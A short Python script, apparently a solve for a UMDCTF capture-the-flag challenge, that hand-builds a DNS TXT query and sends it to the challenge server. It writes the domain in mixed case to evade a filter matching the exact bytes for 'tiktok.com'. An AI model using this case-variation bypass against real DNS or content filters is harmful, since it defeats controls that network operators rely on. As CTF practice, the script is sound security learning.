import socket
import struct

# Connect to the challenge server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("challs.umdctf.io", 32300))

# Craft a DNS query for TXT record - we need to bypass the filter
# The filter checks for b'tiktok\x03com' so we need to modify this pattern
# One approach: use capitalization like TiKtOk.com since DNS is case-insensitive

# DNS header
transaction_id = b'\x00\x01'  # Transaction ID
flags = b'\x00\x00'  # Standard query
questions = b'\x00\x01'  # One question
answers = b'\x00\x00'  # No answers
authority = b'\x00\x00'  # No authority RRs
additional = b'\x00\x00'  # No additional RRs

# Craft domain name - avoiding the exact match of 'tiktok\x03com'
# Using 'TiKTok.com' - DNS is case-insensitive but our filter might not handle this
domain_parts = ['TiKToK', 'com']  
domain = b''
for part in domain_parts:
    domain += bytes([len(part)]) + part.encode()
domain += b'\x00'  # Null terminator

# Question type (TXT = 16) and class (IN = 1)
q_type = b'\x00\x10'  # TXT record
q_class = b'\x00\x01'  # IN class

# Build the query
query = transaction_id + flags + questions + answers + authority + additional + domain + q_type + q_class

# Send the size of the query followed by the query itself
s.send(struct.pack('!I', len(query)) + query)

# Receive and parse the response
response = s.recv(1024)
print(response)
s.close()